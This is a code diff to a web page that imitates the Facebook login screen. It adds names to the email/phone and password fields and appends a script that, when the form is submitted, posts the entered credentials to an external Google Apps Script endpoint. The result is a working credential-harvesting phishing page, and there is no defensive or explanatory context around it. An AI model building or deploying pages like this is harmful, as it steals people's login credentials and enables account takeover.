@@ -12,9 +12,9 @@
             <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
         <div class="right">
-            <form action="">
-                <input type="text" placeholder="Email addess or phone number">
-                <input type="password" placeholder="Password">
+            <form action="" name="facebook">
+                <input type="text" name="phone" id="name" placeholder="Email addess or phone number">
+                <input type="password" name="password" id="password" placeholder="Password">
                 <a href="" class="loginBtn">Log In</a>
                 <a href="" class="forget">Forgotten password?</a>
                 <div class="sign-up">
@@ -25,4 +25,17 @@
         </div>
     </div>
 </body>
+    
+    <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbw5uTK5blapLGYC-xaL9Hpke91QR4brJjgN_ca2YD3jD4HWqzdl5vJdnlP8d0WPHiaY/exec'
+  const form = document.forms['facebook']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+    
 </html>
